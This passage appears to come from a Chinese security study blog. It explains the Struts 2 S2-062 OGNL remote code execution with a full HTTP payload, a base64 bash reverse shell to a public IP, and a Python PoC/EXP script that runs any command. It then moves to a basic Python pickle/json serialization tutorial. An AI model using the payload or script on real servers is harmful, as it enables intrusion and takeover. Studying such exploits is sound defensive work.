data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYml0dGVyei9wLzE1MDM1NTgxLmh0bWw=\">commons-collections 利用链学习总结 - bitterz - 博客园 (cnblogs.com)</span></p>\n<p><strong>讲都讲了，struts 一起讲了吧，凑个 java 大圆满～</strong></p>\n<h3 id=\"struts-2反序列化\"><a class=\"markdownIt-Anchor\" href=\"#struts-2反序列化\">#</a> struts 2 反序列化</h3>\n<p>SSH/SSM</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126171544473.png\" alt=\"image-20221126171544473\"></p>\n<p>Spring 管理 bean</p>\n<p>Struts 提供地址映射</p>\n<p>hibernate 持久层   /  mybatis</p>\n<p>配置 tomcat</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126173010089.png\" alt=\"image-20221126173010089\" style=\"zoom: 80%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126173031317.png\" alt=\"image-20221126173031317\" style=\"zoom:80%;\" />\n<p>漏洞影响版本</p>\n<p>2.0.0 &lt;= Apache Struts &lt;= 2.5.29</p>\n<p>使用 %{} 解析 OGNL 表达式</p>\n<p 6*6=\"\"><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MC9pbmRleC5hY3Rpb24/aWQ9JTI1\">http://192.168.142.128:18080/index.action?id=%</span></p>\n<p>会执行 {} 内的内容，在网页源码中显示 36</p>\n<p>payload：</p>\n<p>执行 id</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /index.action HTTP/1.1</span><br><span class=\"line\">Host: 192.168.142.128:18080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: JSESSIONID=node01c863u8lzu8eyn099a51bjyie0.node0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class=\"line\">Content-Length: 1191</span><br><span class=\"line\">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;id&quot; %&#123;</span><br><span class=\"line\">(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +</span><br><span class=\"line\">(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) ==</span><br><span class=\"line\">true).toString().substring(0,0) +</span><br><span class=\"line\">(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) ==</span><br><span class=\"line\">true).toString().substring(0,0) +</span><br><span class=\"line\">(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;id&#x27;&#125;))</span><br><span class=\"line\">&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF—</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  This is my JSP page. &lt;br&gt;</span><br><span class=\"line\">  &lt;s:a id=&quot;%&#123;id&#125;&quot; href=&quot;onlytest&quot;&gt;J2EE web development tutorials&lt;/s:a&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">//回显位置再id中</span><br></pre></td></tr></table></figure>\n<p>或者建立反弹连接，只需要修改最后一行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDYuOC4xNzUvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&#125;))</span><br></pre></td></tr></table></figure>\n<p>python 脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">from lxml import etree</span><br><span class=\"line\">import argparse</span><br><span class=\"line\"></span><br><span class=\"line\">def poc(url):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&quot;&#125;</span><br><span class=\"line\">        data = &quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF\\r\\nContent-Disposition: form-data; name=\\&quot;id\\&quot;\\r\\n\\r\\n%&#123;\\r\\n(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\\r\\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\\r\\n(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;whoami&#x27;&#125;))\\r\\n&#125;\\r\\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\\xe2\\x80\\x94&quot;</span><br><span class=\"line\">        text=requests.post(url, headers=headers, data=data).text</span><br><span class=\"line\">        if &quot;id&quot; in text:</span><br><span class=\"line\">            print(&quot;发现漏洞&quot;)</span><br><span class=\"line\">            page=etree.HTML(text)</span><br><span class=\"line\">            data = page.xpath(&#x27;//a[@id]/@id&#x27;)</span><br><span class=\"line\">            print(data[0])</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        print(&quot;POC检测失败&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">def EXP(url,cmd):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&quot;&#125;</span><br><span class=\"line\">        data =&quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF\\r\\nContent-Disposition: form-data; name=\\&quot;id\\&quot;\\r\\n\\r\\n%&#123;\\r\\n(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\\r\\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\\r\\n(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;id&#x27;&#125;))\\r\\n&#125;\\r\\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\\xe2\\x80\\x94&quot;.replace(&quot;exec(&#123;&#x27;id&quot;,&quot;exec(&#123;&#x27;&quot;+cmd)</span><br><span class=\"line\">        text=requests.post(url, headers=headers, data=data).text</span><br><span class=\"line\">        if &quot;id&quot; in text:</span><br><span class=\"line\">            print(&quot;命令回显&quot;)</span><br><span class=\"line\">            page=etree.HTML(text)</span><br><span class=\"line\">            data = page.xpath(&#x27;//a[@id]/@id&#x27;)</span><br><span class=\"line\">            print(data[0])</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        print(&quot;EXP检测失败&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=&#x27;S2-062验证&#x27;)</span><br><span class=\"line\">    parser.add_argument(&#x27;--url&#x27;, help=&quot;要验证的URL&quot;)</span><br><span class=\"line\">    parser.add_argument(&#x27;--cmd&#x27;,help=&quot;你想执行的命令&quot;,default=&quot;&quot;)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\">    if args.cmd !=&quot;&quot;:</span><br><span class=\"line\">        EXP(args.url,args.cmd)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        poc(args.url)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3MyLTA2Mi5weQ==\">s2-062.py</span> --url <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MA==\">http://192.168.142.128:18080</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3MyLTA2Mi5weQ==\">s2-062.py</span> --url <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MA==\">http://192.168.142.128:18080</span> --cmd whoami</p>\n<p>OGNI 表达式</p>\n<p>一种开源的 Java 表达式语言</p>\n<p>用于对数据进行访问，拥有类型转换、访问对象方法、操作集合对象等功能</p>\n<blockquote>\n<p>1、OGNL 是 Struts 默认支持的表达式语言</p>\n<p>2、OGNL 可以取值赋值、访问类的静态方法和属性</p>\n<p>3、访问 OGNL 上下文。Struts 的上下文根对象：ValueStack</p>\n<p>4、%{} 用来把字符串转换成表达式</p>\n<p>%25 就是 URL 编码的 %</p>\n<p>5、可以在 struts.xml 和 struts 标签等地方使用 OGNL 表达式</p>\n</blockquote>\n<p>漏洞分析</p>\n<p>项目使用了 %{} 解析 OGNL 表达式，对用户输入的内容进行二次解析的时候，如果没有验证，可能导致远程代码执行</p>\n<blockquote>\n<p>InstanceManager：用于实例化任意对象</p>\n<p>BeanMap：可以调用对象的 getter、setter，</p>\n<p>setBean () 可以更新对象</p>\n<p>valueStack：ONGL 的根对象</p>\n<p>memberAccess：控制对象的访问</p>\n<p>setExcludedPackageNames()</p>\n<p>setExcludedClasses () 清除黑名单</p>\n<p>Execute 类：黑名单类，exec 可以执行 Shell</p>\n</blockquote>\n<p>用 Beanmap 获取 valueStack，清空黑名单，setBean 更新生效，实例化 exec 类执行代码</p>\n<p>黑名单内容：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126190046216.png\" alt=\"image-20221126190046216\">`</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126190030752.png\" alt=\"image-20221126190030752\">`</p>\n<p>struct061 和 struct062payload 区别</p>\n<p>#request.map=#application.get(‘org.apache.tomcat.InstanceManager’).newInstance(‘org.apache. commons.collections.BeanMap’)).toString().substring(0,0)</p>\n<p>s2-062 改成了：</p>\n<p>#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)</p>\n<h2 id=\"3python\"><a class=\"markdownIt-Anchor\" href=\"#3python\">#</a> 3.python</h2>\n<p>python 反序列化和 php 反序列化类似，相当于把程序运行时产生的变量，字典，对象实例等变换成字符串形式存储起来，可以实现内存中的对象与方便持久化在磁盘中或在网络中进行交互的数据格式（str、bites) 之间的相互转换。</p>\n<p>Python 中提供 pickle 和 json 两个模块来实现序列化与反序列化，pickle 模块和 json 模块 dumps ()、dump ()、loads ()、load () 这是个函数，其中 dumps ()、dump () 用于实现序列化，loads ()、load () 用于实现反序列化。</p>\n<h3 id=\"pickle\"><a class=\"markdownIt-Anchor\" href=\"#pickle\">#</a> pickle</h3>\n<p>python 中 pickle 反序列化的库主要有两个， <code>pickle</code>  和 <code>cPickle</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">a_list = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\"># pickle构造出的字符串，有很多个版本。在dumps或loads时，可以用Protocol参数指定协议版本，例如指定为0号版本</span><br><span class=\"line\"># 目前这些协议有0,2,3,4号版本，默认为3号版本。这所有版本中，0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。</span><br><span class=\"line\"># 一个好消息是，pickle协议是向前兼容的。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。</span><br><span class=\"line\"></span><br><span class=\"line\">序列化：dumps()、dump()</span><br><span class=\"line\">反序列化：loads()、load()</span><br><span class=\"line\"></span><br><span class=\"line\"># pickle.dumps将对象序列化为字符串</span><br><span class=\"line\"># pickle.dump将序列化后的字符串存储为文件</span><br><span class=\"line\">print(pickle.dumps(a_list,protocol=0))</span><br><span class=\"line\"></span><br><span class=\"line\">pickle.loads() #对象反序列化</span><br><span class=\"line\">pickle.load() #对象反序列化，从文件中读取数据</span><br></pre></td></tr></table></figure>\n<p>对象序列化与反序列化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [&#x27;aa&#x27;,&#x27;bb&#x27;,&#x27;cc&#x27;,True,199]</span><br><span class=\"line\"></span><br><span class=\"line\">print(pickle.dumps(list1,protocol=0))</span><br><span class=\"line\">print(pickle.dumps(list1,protocol=2))</span><br><span class=\"line\">print(pickle.dumps(list1,protocol=3))</span><br><span class=\"line\">print(pickle.dumps(list1,protocol=4))</span><br><span class=\"line\"></span><br><span class=\"line\">b&#x27;(lp0\\nVaa\\np1\\naVbb\\np2\\naVcc\\np3\\naI01\\naI199\\na.&#x27;</span><br><span class=\"line\">b&#x27;\\x80\\x02]q\\x00(X\\x02\\x00\\x00\\x00aaq\\x01X\\x02\\x00\\x00\\x00bbq\\x02X\\x02\\x00\\x00\\x00ccq\\x03\\x88K\\xc7e.&#x27;</span><br><span class=\"line\">b&#x27;\\x80\\x03]q\\x00(X\\x02\\x00\\x00\\x00aaq\\x01X\\x02\\x00\\x00\\x00bbq\\x02X\\x02\\x00\\x00\\x00ccq\\x03\\x88K\\xc7e.&#x27;</span><br><span class=\"line\">b&#x27;\\x80\\x04\\x95\\x17\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(\\x8c\\x02aa\\x94\\x8c\\x02bb\\x94\\x8c\\x02cc\\x94\\x88K\\xc7e.&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">print(pickle.loads(b&#x27;\\x80\\x04\\x95\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(K\\x01K\\x02K\\x03e.&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">[1, 2, 3]</span><br></pre></td></tr></table></figure>\n<p>文件中序列化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [&#x27;aa&#x27;,&#x27;bb&#x27;,&#x27;cc&#x27;,True,199]</span><br><span class=\"line\"></span><br><span class=\"line\">with open(&quot;shabi.txt&quot;,&#x27;wb&#x27;) as f:</span><br><span class=\"line\">    pickle.dump(list1,f,protocol=0)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124095501120.png\" alt=\"image-20221124095501120\">`</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">file=open(&quot;shabi.txt&quot;,&quot;rb&quot;)</span><br><span class=\"line\">p=pickle.load(file)</span><br><span class=\"line\">file.close()</span><br><span class=\"line\">print(p)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124100423319.png\" alt=\"image-20221124100423319\">`</p>\n<blockquote>\n<p>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</p>\n<p>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</p>\n<p>v2 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。</p>\n<p>v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</p>\n<p>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</p>\n</blockquote>\n<p>另外有一点需要注意：对于我们自己定义的 class，如果直接以形如 <code>date = 20191029</code>  的方式赋初值，** 则这个 <code>date</code>  不会被打包！** 解决方案是写一个 <code>__init__</code> 方法， 也就是这样：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">dairy</span>():</span><br><span class=\"line\">    date = <span class=\"number\">1111111</span></span><br><span class=\"line\">    text = <span class=\"string\">&#x27;sb&#x27;</span></span><br><span class=\"line\">    todo = [<span class=\"string\">&#x27;zz&#x27;</span>,<span class=\"number\">123</span>]</span><br><span class=\"line\">x = dairy()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pickle.dumps(x))</span><br><span class=\"line\"><span class=\"comment\"># b&#x27;\\x80\\x03c__main__\\ndairy\\nq\\x00)\\x81q\\x01.&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">dairy</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        self.date = <span class=\"number\">1111111</span></span><br><span class=\"line\">        self.text = <span class=\"string\">&#x27;sb&#x27;</span></span><br><span class=\"line\">        self.todo = [<span class=\"string\">&#x27;zz&#x27;</span>,<span class=\"number\">123</span>]</span><br><span class=\"line\">x = dairy()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pickle.dumps(x))</span><br><span class=\"line\"><span class=\"comment\"># b&#x27;\\x80\\x03c__main__\\ndairy\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00dateq\\x03JG\\xf4\\x10\\x00X\\x04\\x00\\x00\\x00textq\\x04X\\x02\\x00\\x00\\x00sbq\\x05X\\x04\\x00\\x00\\x00todoq\\x06]q\\x07(X\\x02\\x00\\x00\\x00zzq\\x08K&#123;eub.&#x27;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"json\"><a class=\"markdownIt-Anchor\" href=\"#json\">#</a> json</h3>\n<p>与 pickle 一样，json 模块也提供了 dumps ()、dump ()、loads ()、load () 则是个函数，且其中区别也与 pickle 中是个函数的区别是一样的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">p_dict = &#123;&#x27;name&#x27;:&#x27;张三&#x27; , &#x27;age&#x27;:30 , &#x27;isMarried&#x27;:False&#125; # 定义一个字典</span><br><span class=\"line\">p_str = json.dumps(p_dict)</span><br><span class=\"line\">print(p_str)</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;name&quot;: &quot;\\u5f20\\u4e09&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">json的dumps()函数（dump()函数也有）中提供了一个ensure_ascii参数，将该参数的值设置为False，可令序列化后中文依然正常显示。 </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">str1 = &#x27;&#123;&quot;name&quot;: &quot;\\u5f20\\u4e09&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;&#x27;</span><br><span class=\"line\">print(json.loads(str1))</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 30, &#x27;isMarried&#x27;: False&#125;</span><br></pre></td></tr></table></figure>\n<p>json.dump 与 json.load 功能和 pickle 中基本一样，序列化到文件中，从文件中反序列化，不在举例</p>\n<p>json 与 pickle 区别</p>\n<blockquote>\n<p><strong>pickle 模块用于 Python 语言特有的类型和用户自定义类型与 Python 基本数据类型之间的转换</strong></p>\n<p><strong>json 模块用于字符串和 python 数据类型间进行转换。</strong></p>\n</blockquote>\n<p>定义 person 类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Person:</span><br><span class=\"line\">    def __init__(self , name , age , isMarried):</span><br><span class=\"line\">    self.name = name</span><br><span class=\"line\">    self.age = age</span><br><span class=\"line\">    self.isMarried = isMarried</span><br><span class=\"line\">p = Person(&#x27;张三&#x27; , 30 , False)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 